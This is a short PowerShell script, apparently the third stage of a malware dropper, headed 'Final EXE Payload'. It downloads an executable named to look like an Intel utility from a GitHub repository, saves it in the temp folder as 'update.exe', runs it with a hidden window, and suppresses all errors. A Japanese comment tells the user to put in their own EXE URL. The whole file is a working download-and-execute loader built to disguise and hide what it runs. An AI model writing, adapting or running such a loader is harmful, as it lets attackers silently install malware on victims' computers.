# Stage3 - Final EXE Payload
$exeUrl = "https://github.com/John786Smith/Fix/raw/refs/heads/main/Intel(R)Manager.exe"  # ← 自分のEXE URL
$exePath = "$env:TEMP\update.exe"
try {
    (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
    Start-Process $exePath -WindowStyle Hidden
} catch { }